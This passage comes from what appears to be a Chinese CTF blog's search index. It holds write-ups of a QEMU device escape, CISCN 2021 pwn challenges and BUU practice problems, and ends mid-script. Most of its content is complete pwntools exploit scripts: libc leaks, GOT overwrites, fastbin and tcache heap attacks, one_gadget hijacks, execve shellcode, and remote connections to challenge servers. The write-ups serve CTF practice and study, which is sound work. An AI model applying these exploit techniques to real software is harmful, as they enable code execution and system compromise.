  pmio_write(pmio_base+4,value);\n}\n```\n\n(5)利用pmio空间越界读取漏洞，泄露libc地址：\n\n```\n//注释头\n\nif (iopl(3) !=0 )\n    die(\"I/O permission is not enough\");\n\n// leaking libc address\nuint64_t srandom_addr=pmio_arbread(0x108);\nsrandom_addr=srandom_addr<<32;\nsrandom_addr+=pmio_arbread(0x104);\n//这里的都是为了设置idx从而读取用的\n\nprintf(\"leaking srandom addr: 0x%llx\\n\",srandom_addr);\nuint64_t libc_base= srandom_addr-0x43bb0;\nuint64_t system_addr= libc_base+0x4f440;\nprintf(\"libc base: 0x%llx\\n\",libc_base);\nprintf(\"system addr: 0x%llx\\n\",system_addr);\n//不同的主机环境的libc版本不同，需要修改\n```\n\n(6)利用越界写，将rand_r函数改写成system函数\n\n```\n//注释头\n\n// overwrite rand_r pointer to system\npmio_abwrite(0x114,system_addr&0xffffffff);\n\nmmio_write(0xc,0);//补0\n```\n\n最后编译：gcc -m32 -O0 -static -o exp exp.c，然后传到虚拟机里面，可以用下列两种方法：\n\n①scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu，由于开了端口，所以可以直接通过scp端口传输。\n\n②使用python库简易搭建一个ftp传输：\n\n```\n#注释头\n\n#主机中运行\npython2 -m SimpleHTTPServer\n\n#qemu中运行，其中ip地址需要改变一下，对于主机ip\nwget -O ./exp http://192.168.80.132:8000/exp\n```\n\n最后可以看到成功运行：这里我修改了cat /root/flag命令，变成/bin/sh，可以看到返回了一个主机里面的终端sh，成功实现逃逸。但是这个终端sh输入命令不显示，回显消息比较慢，但是个确确实实的主机终端，如果有条件的话，应该是可以实现多重逃逸的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191502953.jpeg)\n\n \n\n▲qemu逃逸调试：\n\n1.将exp传进qemu之后，在主机上使用命令ps aux|grep qemu，找到qemu的任务id，然后gdb attach qemu_id。\n\n2.下断点在需要的函数：b *strng_mmio_write，然后输入c接着运行。\n\n3.在qemu中sudo ./exp，现在就能在主机的gdb中停下来，就可以调试了。\n\n```\n#注释头\n\np *strng\np strng.regs[1]\np strng.srand\n```\n\n \n\n \n\n参考资料：\n\nhttps://xz.aliyun.com/search?keyword=qemu\n\nhttps://ray-cp.github.io/archivers/qemu-pwn-Blizzard-CTF-2017-Strng-writeup\n","tags":["qemu题"],"categories":["QEMU","qemu-escape"]},{"title":"CISCN2021东北赛区复现","url":"/2021/08/14/CISCN2021东北赛区复现/","content":"\n复现之前，先骂两句。SB形式，SB的自己。\n\n1.hard:这道题目最他丫SB，上来运行不起来，环境调半天，还是运行不起来，再加上VPN崩溃，一直连不上，还以为题目本身优点问题，只能先放弃，转头帮忙去了。后来checksec一下才发现依赖是./lib/，也就是当前文件下需要创建一个lib文件夹，里面放上ld-linux-x86-64.so.2才能运行，我可去他大爷的。\n\n给的分挺高，后面想了想也不算难，主要有三个点。\n\n(1)任意写时修改的地方选择。\n\n(2)calloc传入的nnum为0时，不会申请，会返回0。同样也具备mmap的功能。\n\n(3)最开始初始化的时候，setbuf传入的是_IO_2_1_stdxx的结构体，该结构体在调用scanf，get，printf等需要初始化缓冲区的函数时，会写入缓冲区地址，也就是Libc上某个区域，可以借此联合setbuf来泄露地址。\n\n比赛后和学长交流一下，才想到把最后的puts改成main，我真他丫是个SB，然后就很正常了。\n\n①由于Partial Reload，可以改got表，所以先任意写，将puts改成main，循环程序。\n\n②将exit改成init处的setbuf的地方，将setbuf改成printf，这样再进入init的地方时，就会打印处_IO_2_1_stdxx的结构体的值。\n\n③由于打印_IO_2_1_stdxx的结构体的值时，打印处flag之后就会被0x00截断，所以需要修改flag处的值。这里通过calloc输入过大的nnum时会从mmap申请内存，返回的是mmap空间，也就是libc上的地址。同时由于关闭了PIE，偏移不会发生改变，所以直接调试计算偏移即可。\n\n④泄露地址后，同样利用calloc申请mmap的方法，将calloc_got改成one_gadget即可。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwn\"\nlibc_file = \"/lib/x86_64-linux-gnu/libc-2.31.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['./lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./lib/libc.so.6\"})\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"119.3.81.43\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\n\ndef write(offset, con):\n    ru(\": \")\n    sl(\"-1\")\n    ru(\": \")\n    sl(str(offset // 4))\n    ru(\":\")\n    sl(str(con))\n\ndef write2(offset, con):\n    ru(\": \")\n    sl(str(0x100000))\n    ru(\": \")\n    sl(str(offset // 4))\n    ru(\":\")\n    sl(str(con))\n\n\nmain_addr = 0x40078D\nputs_got = elf.got['puts']\nsetbuf_got = elf.got['setbuf']\nexit_got = elf.got['exit']\nprintf_plt = elf.plt['printf']\nsetbuf_plt = elf.plt['setbuf']\ncalloc_got = elf.got['calloc']\nsetbuf_init = 0x40086a\n\n\nlog.info(\"puts_got:0x%x\"%puts_got)\nlog.info(\"setbuf_got:0x%x\"%setbuf_got)\nlog.info(\"exit_got:0x%x\"%exit_got)\nlog.info(\"printf_plt:0x%x\"%printf_plt)\nlog.info(\"setbuf_plt:0x%x\"%setbuf_plt)\nlog.info(\"calloc_got:0x%x\"%calloc_got)\n\n\nwrite(puts_got,main_addr) #puts->main\nwrite(setbuf_got,printf_plt) #setbuf->printf\nwrite(setbuf_got+4,\"0\") #setbuf->printf\nwrite(exit_got,setbuf_init) #exit->setbuf\n\n\n# gdb.attach(p, \"b *(0x400854) \\n c\")\nIO_stdin4_mmap = 0x5EC974 #without PIE\nIO_stdin_1_libc = 0x1EBA03\nwrite2(IO_stdin4_mmap,0x11111111) #IO_stdin.flag->0x111111111fbad208b\nsla(': ', str(256))\nleak = u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8, \"\\x00\"))\nlibc_base = leak - IO_stdin_1_libc\nlog.info(\"libc_base:0x%x\"%libc_base)\none_gadget = libc_base + 0xe6c81\n\nru(\": \")\nsl(\"0\")\nru(\":\")\nsl(\"0\")\n\nwrite(calloc_got, one_gadget & 0xffffffff)\nru(\": \")\nsl(str(0))\np.interactive()\n```\n\n2.gift：这道题目我认栽，确实是做题经验少了，忘了利用chunk头+chunk联合fastbin的FILO原则来修改chunk头了。\n\n(1)改chunk头，加上UAF漏洞，利用chunk头里的函数指针和参数，改成printf，直接格式化字符串泄露地址。\n\n(2)同样道理，直接改函数指针指向堆上伪造的system_addr，利用参数/bin/sh直接getshell。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./GIFT\"\nlibc_file = \"/lib/x86_64-linux-gnu/libc-2.23.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \">> \"\n\n\ndef add(size, con):\n    sla(menu, \"1\")\n    sla(\"size: \", str(size))\n    sa(\"content: \", con)\n\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\nadd(0x28, \"\\x00\") #0\nadd(0x28, \"\\x01\") #1\n\ndelete(0)\ndelete(1)\n\nadd(0x18, \"%8$p%9$p\"+\"\\x30\") #2\ndelete(0)\nru(\"0x\")\nheap_base = int(p.recv(12),16)-0x10\nlibc_base = int(p.recv(14),16) - 0x55810\n# li(\"libc_base\", libc_base)\n# li(\"leak\", leak)\nlog.info(\"heap_base:0x%x\"%heap_base)\nlog.info(\"libc_base:0x%x\"%libc_base)\n\nsystem_addr = libc_base + libc.sym['system']\n\nadd(0x38, \"\\x03\") #3\nadd(0x38, \"\\x04\") #4\nadd(0x48,p64(system_addr))#5\n\nheap_system = heap_base+0x50+0x50+0x60+0x60+0x20+0x10\ndelete(3)\ndelete(4)\nadd(0x18,\"/bin/sh\\x00\"+p64(heap_system)) #6\ndelete(3)\np.interactive()\n```\n\n \n\n3.small_chunk：我觉得出得最好的是这道题，确实不错。\n\n(1)首先布局，利用off-by-one制作堆块重叠，然后unsortedbin泄露地址。\n\n(2)由于chunk只能申请0x20和0x30，所以想要打fastbin attack，一般有以下三种方案来绕过：\n\n①调用malloc_consolidate，整理fastbin中的chunk，使得fake_chunk的size变成合法的。这个有三种情况，具体分析，我都尝试了个遍，这里一个也用不了。\n\n②利用unsotedbin attack，不过这个只能针对0x7f的情况，这里不太行。\n\n③利用fastbinY链表，先伪造一个fastbin_chunk的fd为0x21或者0x31，申请回来fastbin_chunk，将0x21或者0x31留到fastbinY链表中，这样在main_arena中就留下了一个0x21或者0x31的数值，就可以利用这个数值伪造size来申请chunk到main_arena。之后0x20和0x30的fastbin打配合，将top_chunk地址改成malloc_hook的地方，再申请就可以申请到malloc_hook了。\n\n需要注意的是，top_chunk改地址，需要绕过一些检测，所以一般两种情况：\n\nA.free_hook-0xb58\n\nB.malloc_hook-0x10\n\n以上两种的size域都是一个libc地址，能够通过检测\n\n这里由于堆块个数不够用，所以选择方案B，修改完malloc_hook为one_gadget后，再申请即可getshell。\n\n▲这里在后面的复现中有点犯蠢，本来想申请到bss段上的，没办法泄露elf基地址。vmmap一看，发现heap_base和bss段固定偏移0x1000，这可给我高兴坏了，直接打bss段的size区域的地方。打完后，关机之后，再打开发现不顶用了。得，ASLR我之前给关了，再开就不是固定偏移了.....\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./small_chunk\"\nlibc_file = \"./libc.so.6\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.23.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    #p = process(binary)\n    p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \">> \"\n\n\ndef add(size):\n    sla(menu, \"1\")\n    sla(\"size: \", str(size))\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\ndef show(idx):\n    sla(menu, \"3\")\n    sla(\"index: \", str(idx))\n\ndef edit(idx, con):\n    sla(menu, \"4\")\n    sla(\"index: \", str(idx))\n    sa(\"content: \",con)\n\nadd(0x18)#0\nadd(0x18)#1\ndelete(1)\ndelete(0)\nadd(0x18)\nshow(0)\nru(\"content: \")\nheap_base = u64(rc(6).ljust(8,\"\\x00\"))-0x20\nlog.info(\"heap_base:%x\"%heap_base)\nadd(0x18)#1\nchunk2_addr = heap_base+0x40\nlog.info(\"chunk2_addr:%x\"%chunk2_addr)\n\nadd(0x28) #idx2\nadd(0x28) #idx3\nadd(0x28) #idx4\n\nadd(0x28) #idx5\nadd(0x28) #idx6\nadd(0x18) #idx7\n\nadd(0x28) #idx8\nadd(0x28) #idx9\nadd(0x28) #idx10\nedit(2,\np64(0x0)+p64(0x81) #fakechunk.pre_size,fakechunk.size\n+p64(chunk2_addr+0x10)+p64(chunk2_addr+0x10) #fakechunk.fd,fakechunk.bk\n+p64(0x80)+p64(0x31)) #chunk1.pre_size, fakechunk.size = sizeof(chunka)-0x10\n#trigger off-by-null or other overflow to set chunkb.pre_inuse equals to 1;\n\n\nedit(4,p64(0x0)*4+p64(0x80)+p64(0xb0)) #chunk1.pre_size, fakechunk.size = sizeof(chunka)-0x10\n#trigger off-by-null or other overflow to set chunkb.pre_inuse equals to 1;\ndelete(5)\nadd(0x18) #5\nedit(2,\"A\"*0x10)\nshow(2)\nru(\"content: \")\nrc(0x10)\nmain_arena = u64(rc(6).ljust(8,\"\\x00\"))-88 -0x100-0x20\nmalloc_hook = main_arena-0x10\nlibc_base = malloc_hook-libc.sym['__malloc_hook']\nlog.info(\"libc_base:0x%x\"%libc_base)\nsystem_addr = libc_base + libc.sym[\"system\"] #system\nfree_hook_addr = libc_base + libc.sym[\"__free_hook\"]\nmalloc_hook_addr = libc_base +libc.sym[\"__malloc_hook\"]\ntop_addr_main = main_arena+88\none_gadget = libc_base + 0xf1247\n\n\nlog.info(\"free_hook_addr:0x%x\"%free_hook_addr)\nlog.info(\"system_addr:0x%x\"%system_addr)\nlog.info(\"main_arena:0x%x\"%main_arena)\nlog.info(\"malloc_hook_addr:0x%x\"%malloc_hook_addr)\nadd(0x28) #11\nedit(11,\"/bin/sh\\x00\")\nadd(0x28) #12\nadd(0x28) #13\nadd(0x28) #14\nadd(0x18) #15\ndelete(7)\nedit(15,p64(0x31))\nadd(0x18)#7\ndelete(4)\nedit(12,p64(main_arena))\nadd(0x28)#4\nadd(0x28)#16\nedit(16,p64(main_arena+0x30)+p64(0x0)\n+p64(0x0)*3+p64(0x31))\nadd(0x28)#17\nedit(17,p64(0x0)*3+p64(malloc_hook_addr-0x10))\npause()\nadd(0x28)#18\nadd(0x28)#19\nedit(19,p64(one_gadget))\npause()\nadd(0x28)\np.interactive()\n```\n\n其实这次比赛也学到很多，虽然比赛的时候一道题也没写出来，总的来说还是自己的经验太少。\n\n \n","tags":["比赛"],"categories":["PWN"]},{"title":"CISCN-BUU刷题记录2","url":"/2021/08/14/CISCN-BUU刷题记录2/","content":"\n1.ciscn_2019_es_1：UAF，tcache dup，比较常规，泄露地址，打free_hook。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_2019_es_1\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"27956\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"choice:\"\n\n\ndef add(size, con, call):\n    sla(menu, \"1\")\n    sla(\"compary's name\\n\", str(size))\n    sa(\"name:\\n\", con)\n    sla(\"compary call:\\n\", str(call))\n\ndef delete(idx):\n    sla(menu, \"3\")\n    sla(\"index:\\n\", str(idx))\n\ndef show(idx):\n    sla(menu, \"2\")\n    sla(\"index:\\n\", str(idx))\n\n#main_arena_off = 0x3ebc40\n\nadd(0x410,\"A\",123) #0\nadd(0x18,\"B\",123) #1\nadd(0x08,\"/bin/sh\\x00\",123) #2\n\ndelete(0)\nshow(0)\nru(\"name:\\n\")\nmalloc_hook = u64(rc(6).ljust(8,\"\\x00\")) - 96 - 0x10\nobj = LibcSearcher(\"__malloc_hook\",malloc_hook)\nlibc_base = malloc_hook - obj.dump(\"__malloc_hook\")\nlog.info(\"libc_base:0x%x\"%libc_base)\nfree_hook = libc_base + obj.dump('__free_hook')\nsystem_addr = libc_base + obj.dump('system')\ndelete(1)\ndelete(1)\nadd(0x18,p64(free_hook),123) #3\nadd(0x18,p64(system_addr),123) #4\nadd(0x18,p64(system_addr),123) #5\ndelete(2)\npause()\np.interactive()\n```\n\n2.ciscn_s_9：这题有点意思，栈溢出长度比较短，但是还是够用来泄露地址然后ret2libc。除此之外题目中给了一个hint，可以直接借用jump esp这个gadget来手写shellcode，拉动esp上移到我们输入位置，这样就不再需要考虑到劫持ebp上挪之后的函数剩下的汇编代码。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'i386'\nSigreturnFrame(kernel = 'i386')\n\nbinary = \"./ciscn_s_9\"\n#libc.so = \"./libc-2.24.so\"\n#libc.so = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n\n#libcsearcher use\n'''\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\n'''\n\n\nlocal = 0\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"26029\")\n    elf = ELF(binary)\n    #libc = ELF(libc.so)\n\n#sh has been in ELF\n'''\nsh_addr = 0x080482EA\npayload = \"\"\npayload += \"A\"*(0x48+0x4)\npayload += p32(system_plt)\npayload += p32(0x11111111) #paddding(system_plt ret addr)\npayload += p32(sh_addr)\n'''\n\n\n#sh not in ELF\n'''\npayload = \"\"\npayload += \"A\"*0x10\npayload += p32(read_plt)\npayload += p32(system_plt)\npayload += p32(0x1) #fd\npayload += p32(binsh_addr) #parameter\npayload += p32(0x4) #n\npayload += p32(binsh_addr)\n'''\n\n#leak addr\n'''\npayload1 = \"\"\npayload1 += \"A\"*0x10\npayload1 += p32(puts_plt)\npayload1 += p32(main_addr)\npayload1 += p32(puts_got)\n\npayload2 = \"\"\npayload2 = \"A\"*0x10\npayload2 += p32(system_plt)\npayload2 += p32(0x11111111) #paddding(system_plt ret addr)\npayload2 += p32(binsh_addr)\n'''\n\njump_esp = 0x08048554\n\nshellcode= '''\nxor ecx,ecx\nxor edx,edx\npush edx\npush 0x68732f2f\npush 0x6e69622f\nmov ebx,esp\nxor eax,eax\nmov al,0xB\nint 0x80\n'''\nshellcode=asm(shellcode)\n\npayload = \"\"\npayload += shellcode\npayload = payload.ljust(0x24,\"A\")\npayload += p32(jump_esp)\npayload += asm(\"sub esp,40;call esp\")\n\nru(\">\\n\")\npause()\nsl(payload)\npause()\np.interactive()\n```\n\n3.ciscn_final_2：这题真是最有意思了，调了我快一天。\n\n(1)bool公用，dup free之前必须先申请。\n\n(2)int_pt和short_int_pt全局。\n\n(3)开了seccomp保护，但是最开始加载了flag，句柄fd设置为666。\n\n▲漏洞在没有清空指令，可以UAF和tcache dup。先常规思考一下思路，UAF和tcache dup泄露堆地址，之后构造chunk进入unsortedbin中，泄露libc地址，然后利用堆块上残留的libc地址部分写覆盖_IO_2_2_stdin_结构体中的fileno为666，这样在choice>4就可以利用scanf来直接读取句柄fd中的内容，也就是flag，顺带打印出来。\n\n其它不说，需要注意的也就是一个printf的格式化输出，泄露堆地址的时候用int接收，然后判断一下是否小于0，小于0则加上0x100000000即可。\n\n主要说libc地址泄露和利用。这里利用部分堆地址进行一定堆布局，修改int_chunk的size为0x4b1，这里我弄大了，只要超过tcache最大限制即可。(然后我看网上常规思路都是填满大于fastbin的tcache，但是我嫌比较麻烦，就用了自己的方法，事实证明大佬的方法其实更有效，比较不容易出错)然后就比较坑爹了。\n\n①由于只有部分libc地址，所以两个选择，一是爆破，0x7fxx--------，需要大概爆破一个字节，0xff次。二是利用chunk上残留的地址，结合tcache up和UAF直接改后面四个字节，直接申请到我们想要地方。这里用第二种方法\n\n②但是最坑爹的就是，scanf申请堆块啊，具体不知道申请多大，但是程序中可以输入99个字符，调试了好久，指定会申请堆块。\n\n③如果直接利用int_chunk上残留的libc地址，但是这时候int_chunk已经被放入到unsortedbin中，结合tcache up和UAF势必会修改int_chunk的fd，然后就会造成unsortedbin被破坏，再加上之后的scanf申请堆块，不会从0x20和0x30的tcache中申请，得，直接崩溃：\n\nmalloc(): memory corruption: 0x00007fae88dc8c10 ***\\n\"\n\n④然后我又想到要不为scanf预留一个chunk到tcache中？这样就不会从unsortedbin中切割了。结果调好久没调出来，果断放弃。\n\n⑤最后灵光一闪，想到干嘛不直接劫持tcache结构体，由于int_chunk被放入unsortedbin中，那么如果int_chunk也在tcache中，就可以使得tcache结构体中0x30链表上留下main_arena+96的指针了啊。这样再申请short_chunk到这里，直接修改指针，再申请int_chunk就会申请到我们修改的地方，这样就不会造成unsortedbin破坏。\n\n▲看了大佬的，还是直接填满tcache省事，不破坏unsortedbin。\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\nfrom LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./ciscn_final_2\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.26.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"29139\")\n    elf = ELF(binary)\n    #libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \"which command?\\n> \"\n\n\ndef add(Type, con):\n    sla(menu, \"1\")\n    sla(\">\", str(Type))\n    sa(\"your inode number:\", con)\n\ndef delete(Type):\n    sla(menu, \"2\")\n    sla(\">\", str(Type))\n\ndef show(Type):\n    sla(menu, \"3\")\n    